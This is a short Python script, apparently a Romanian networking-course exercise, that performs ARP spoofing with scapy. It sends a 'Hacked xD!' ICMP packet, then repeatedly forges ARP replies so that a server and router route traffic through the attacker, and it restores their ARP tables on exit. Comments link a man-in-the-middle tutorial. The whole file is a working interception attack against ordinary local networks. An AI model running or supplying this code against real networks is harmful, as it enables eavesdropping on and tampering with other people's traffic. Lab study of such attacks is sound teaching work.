import scapy.all as scapy
import time


def spoof(server_ip, router_ip, server_mac, router_mac):
    packet = scapy.IP(dst=server_ip) / scapy.ICMP() / "Hacked xD!"
    scapy.send(packet, verbose=False)
    while True:
        packet1 = scapy.ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=router_ip)
        packet2 = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=server_ip)
        scapy.send(packet1, verbose=False)
        scapy.send(packet2, verbose=False)

        time.sleep(10)


def restore(server_ip, router_ip, server_mac, router_mac):
    # Restabilește tabelele ARP ale țintei și router-ului
    packet2 = scapy.ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=server_ip, hwsrc=router_mac, psrc=router_ip, count=5)
    packet1 = scapy.ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=router_ip, hwsrc=server_mac, psrc=server_ip, count=5)
    scapy.send(packet1, count=4, verbose=False)
    scapy.send(packet2, count=4, verbose=False)


router_ip = "198.7.0.1"
server_ip = "198.7.0.2"
router_mac = "02:42:c6:0a:00:01"
server_mac = "02:42:c6:0a:00:03"

try:
    spoof(server_ip, router_ip, server_mac, router_mac)
except KeyboardInterrupt:
    # Restabilește tabelele ARP la închiderea programului
    restore(server_ip, router_ip, server_mac, router_mac)
    restore(router_ip, server_ip, router_mac, server_mac)
    print("\nARP spoofing încheiat. Tabelele ARP au fost restaurate.")

#   Material ajutator pentru acest exercitiu
#   https://medium.com/@ravisinghmnnit12/how-to-do-man-in-the-middle-attack-mitm-with-arp-spoofing-using-python-and-scapy-441ee577ba1b
